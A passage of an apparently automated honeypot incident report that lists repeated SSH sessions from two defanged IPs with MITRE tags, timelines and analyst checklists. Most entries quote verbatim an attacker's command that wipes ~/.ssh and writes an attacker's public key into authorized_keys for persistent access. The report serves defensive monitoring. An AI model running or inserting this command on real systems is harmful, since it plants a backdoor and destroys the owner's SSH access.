| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:02:06` | `cowrie.session.connect` |
| `2026-04-17 12:02:06` | `cowrie.client.version` |
| `2026-04-17 12:02:06` | `cowrie.client.kex` |
| `2026-04-17 12:02:07` | `cowrie.login.success` |
| `2026-04-17 12:02:07` | `cowrie.session.params` |
| `2026-04-17 12:02:07` | `cowrie.command.input` |
| `2026-04-17 12:02:07` | `cowrie.command.failed` |
| `2026-04-17 12:02:07` | `cowrie.log.closed` |
| `2026-04-17 12:02:08` | `cowrie.session.params` |
| `2026-04-17 12:02:08` | `cowrie.command.input` |
| `2026-04-17 12:02:08` | `cowrie.session.file_download` |
| `2026-04-17 12:02:08` | `cowrie.log.closed` |
| `2026-04-17 12:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-453a520ac6a0

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:02 |
| **Last Seen** | 2026-04-17 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:02:10` | `cowrie.session.connect` |
| `2026-04-17 12:02:10` | `cowrie.client.version` |
| `2026-04-17 12:02:10` | `cowrie.client.kex` |
| `2026-04-17 12:02:11` | `cowrie.login.success` |
| `2026-04-17 12:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130e69270167

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:03 |
| **Last Seen** | 2026-04-17 12:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:03:29` | `cowrie.session.connect` |
| `2026-04-17 12:03:29` | `cowrie.client.version` |
| `2026-04-17 12:03:29` | `cowrie.client.kex` |
| `2026-04-17 12:03:30` | `cowrie.login.success` |
| `2026-04-17 12:03:30` | `cowrie.session.params` |
| `2026-04-17 12:03:30` | `cowrie.command.input` |
| `2026-04-17 12:03:30` | `cowrie.command.failed` |
| `2026-04-17 12:03:30` | `cowrie.log.closed` |
| `2026-04-17 12:03:31` | `cowrie.session.params` |
| `2026-04-17 12:03:31` | `cowrie.command.input` |
| `2026-04-17 12:03:31` | `cowrie.session.file_download` |
| `2026-04-17 12:03:31` | `cowrie.log.closed` |
| `2026-04-17 12:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e326c265272

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:03 |
| **Last Seen** | 2026-04-17 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:03:33` | `cowrie.session.connect` |
| `2026-04-17 12:03:33` | `cowrie.client.version` |
| `2026-04-17 12:03:33` | `cowrie.client.kex` |
| `2026-04-17 12:03:34` | `cowrie.login.success` |
| `2026-04-17 12:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ffc7486ab40

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:06 |
| **Last Seen** | 2026-04-17 12:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:06:11` | `cowrie.session.connect` |
| `2026-04-17 12:06:11` | `cowrie.client.version` |
| `2026-04-17 12:06:11` | `cowrie.client.kex` |
| `2026-04-17 12:06:12` | `cowrie.login.success` |
| `2026-04-17 12:06:12` | `cowrie.session.params` |
| `2026-04-17 12:06:12` | `cowrie.command.input` |
| `2026-04-17 12:06:12` | `cowrie.command.failed` |
| `2026-04-17 12:06:12` | `cowrie.log.closed` |
| `2026-04-17 12:06:13` | `cowrie.session.params` |
| `2026-04-17 12:06:13` | `cowrie.command.input` |
| `2026-04-17 12:06:13` | `cowrie.session.file_download` |
| `2026-04-17 12:06:13` | `cowrie.log.closed` |
| `2026-04-17 12:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4a3a39b44d

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:06 |
| **Last Seen** | 2026-04-17 12:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:06:15` | `cowrie.session.connect` |
| `2026-04-17 12:06:15` | `cowrie.client.version` |
| `2026-04-17 12:06:15` | `cowrie.client.kex` |
| `2026-04-17 12:06:16` | `cowrie.login.success` |
| `2026-04-17 12:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22901699fc84

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:08 |
| **Last Seen** | 2026-04-17 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:08:52` | `cowrie.session.connect` |
| `2026-04-17 12:08:52` | `cowrie.client.version` |
| `2026-04-17 12:08:52` | `cowrie.client.kex` |
| `2026-04-17 12:08:53` | `cowrie.login.success` |
| `2026-04-17 12:08:53` | `cowrie.session.params` |
| `2026-04-17 12:08:53` | `cowrie.command.input` |
| `2026-04-17 12:08:53` | `cowrie.command.failed` |
| `2026-04-17 12:08:53` | `cowrie.log.closed` |
| `2026-04-17 12:08:54` | `cowrie.session.params` |
| `2026-04-17 12:08:54` | `cowrie.command.input` |
| `2026-04-17 12:08:54` | `cowrie.session.file_download` |
| `2026-04-17 12:08:54` | `cowrie.log.closed` |
| `2026-04-17 12:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59dce034dd2d

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:08 |
| **Last Seen** | 2026-04-17 12:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:08:56` | `cowrie.session.connect` |
| `2026-04-17 12:08:56` | `cowrie.client.version` |
| `2026-04-17 12:08:56` | `cowrie.client.kex` |
| `2026-04-17 12:08:57` | `cowrie.login.success` |
| `2026-04-17 12:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266e20c17f4c

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:10 |
| **Last Seen** | 2026-04-17 12:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:10:17` | `cowrie.session.connect` |
| `2026-04-17 12:10:17` | `cowrie.client.version` |
| `2026-04-17 12:10:17` | `cowrie.client.kex` |
| `2026-04-17 12:10:18` | `cowrie.login.success` |
| `2026-04-17 12:10:18` | `cowrie.session.params` |
| `2026-04-17 12:10:18` | `cowrie.command.input` |
| `2026-04-17 12:10:18` | `cowrie.command.failed` |
| `2026-04-17 12:10:18` | `cowrie.log.closed` |
| `2026-04-17 12:10:19` | `cowrie.session.params` |
| `2026-04-17 12:10:19` | `cowrie.command.input` |
| `2026-04-17 12:10:19` | `cowrie.session.file_download` |
| `2026-04-17 12:10:19` | `cowrie.log.closed` |
| `2026-04-17 12:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba51529cb10

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:10 |
| **Last Seen** | 2026-04-17 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:10:21` | `cowrie.session.connect` |
| `2026-04-17 12:10:21` | `cowrie.client.version` |
| `2026-04-17 12:10:21` | `cowrie.client.kex` |
| `2026-04-17 12:10:22` | `cowrie.login.success` |
| `2026-04-17 12:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efdfddb728ca

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:11 |
| **Last Seen** | 2026-04-17 12:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:11:40` | `cowrie.session.connect` |
| `2026-04-17 12:11:40` | `cowrie.client.version` |
| `2026-04-17 12:11:41` | `cowrie.client.kex` |
| `2026-04-17 12:11:41` | `cowrie.login.success` |
| `2026-04-17 12:11:41` | `cowrie.session.params` |
| `2026-04-17 12:11:41` | `cowrie.command.input` |
| `2026-04-17 12:11:41` | `cowrie.command.failed` |
| `2026-04-17 12:11:42` | `cowrie.log.closed` |
| `2026-04-17 12:11:42` | `cowrie.session.params` |
| `2026-04-17 12:11:42` | `cowrie.command.input` |
| `2026-04-17 12:11:42` | `cowrie.session.file_download` |
| `2026-04-17 12:11:42` | `cowrie.log.closed` |
| `2026-04-17 12:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c776b1640f2

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:11 |
| **Last Seen** | 2026-04-17 12:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:11:44` | `cowrie.session.connect` |
| `2026-04-17 12:11:44` | `cowrie.client.version` |
| `2026-04-17 12:11:44` | `cowrie.client.kex` |
| `2026-04-17 12:11:45` | `cowrie.login.success` |
| `2026-04-17 12:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b6b6747dc19

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:14 |
| **Last Seen** | 2026-04-17 12:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:14:26` | `cowrie.session.connect` |
| `2026-04-17 12:14:26` | `cowrie.client.version` |
| `2026-04-17 12:14:26` | `cowrie.client.kex` |
| `2026-04-17 12:14:26` | `cowrie.login.success` |
| `2026-04-17 12:14:27` | `cowrie.session.params` |
| `2026-04-17 12:14:27` | `cowrie.command.input` |
| `2026-04-17 12:14:27` | `cowrie.command.failed` |
| `2026-04-17 12:14:27` | `cowrie.log.closed` |
| `2026-04-17 12:14:27` | `cowrie.session.params` |
| `2026-04-17 12:14:27` | `cowrie.command.input` |
| `2026-04-17 12:14:27` | `cowrie.session.file_download` |
| `2026-04-17 12:14:27` | `cowrie.log.closed` |
| `2026-04-17 12:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4054e1342045

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:14 |
| **Last Seen** | 2026-04-17 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:14:29` | `cowrie.session.connect` |
| `2026-04-17 12:14:29` | `cowrie.client.version` |
| `2026-04-17 12:14:30` | `cowrie.client.kex` |
| `2026-04-17 12:14:30` | `cowrie.login.success` |
| `2026-04-17 12:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3932c31e2171

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:19 |
| **Last Seen** | 2026-04-17 12:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:19:29` | `cowrie.session.connect` |
| `2026-04-17 12:19:29` | `cowrie.client.version` |
| `2026-04-17 12:19:29` | `cowrie.client.kex` |
| `2026-04-17 12:19:29` | `cowrie.login.success` |
| `2026-04-17 12:19:30` | `cowrie.session.params` |
| `2026-04-17 12:19:30` | `cowrie.command.input` |
| `2026-04-17 12:19:30` | `cowrie.command.failed` |
| `2026-04-17 12:19:30` | `cowrie.log.closed` |
| `2026-04-17 12:19:30` | `cowrie.session.params` |
| `2026-04-17 12:19:30` | `cowrie.command.input` |
| `2026-04-17 12:19:30` | `cowrie.session.file_download` |
| `2026-04-17 12:19:30` | `cowrie.log.closed` |
| `2026-04-17 12:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ef44652af0

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:19 |
| **Last Seen** | 2026-04-17 12:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:19:32` | `cowrie.session.connect` |
| `2026-04-17 12:19:32` | `cowrie.client.version` |
| `2026-04-17 12:19:33` | `cowrie.client.kex` |
| `2026-04-17 12:19:33` | `cowrie.login.success` |
| `2026-04-17 12:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6247e277e8e3

| Field | Detail |
|---|---|
| **Source IP** | `197.243.14[.]52` |
| **First Seen** | 2026-04-17 12:23 |
| **Last Seen** | 2026-04-17 12:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:23:55` | `cowrie.session.connect` |
| `2026-04-17 12:23:55` | `cowrie.client.version` |
| `2026-04-17 12:23:55` | `cowrie.client.kex` |
| `2026-04-17 12:23:56` | `cowrie.login.success` |
| `2026-04-17 12:23:57` | `cowrie.session.params` |
| `2026-04-17 12:23:57` | `cowrie.command.input` |
